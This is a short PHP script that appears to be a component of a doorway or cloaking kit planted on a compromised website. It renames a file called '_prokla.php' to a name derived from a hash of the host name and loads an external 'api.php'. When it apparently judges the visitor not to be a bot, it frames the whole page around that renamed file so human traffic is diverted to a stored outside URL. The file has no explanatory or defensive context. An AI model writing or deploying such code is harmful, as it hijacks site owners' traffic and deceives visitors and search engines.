<?
		$z_key = $key;
		$MD=md5(md5($_SERVER["HTTP_HOST"]));
		$MD=substr($MD,0,6);
		if (file_exists($_SERVER["DOCUMENT_ROOT"]."/_prokla.php")){
			rename($_SERVER["DOCUMENT_ROOT"]."/_prokla.php", $_SERVER["DOCUMENT_ROOT"]."/$MD.php");
		}
		
		
		include $_SERVER['DOCUMENT_ROOT'].'/api.php';

		if($z_bot == $z_empty && !empty($z_out)){
			$url=$z_out;
			}
		$key=str_ireplace(array("download","free"),'',$key);
		if(strlen($url)>5)
		{
			session_start();
			$_SESSION['url'] = $url;
			$_SESSION['key'] = $key;
			echo '<html><frameset rows="100%"><frame src="https://'.$_SERVER["HTTP_HOST"].'/'."$MD.php".'"></frameset></html>';
		}?>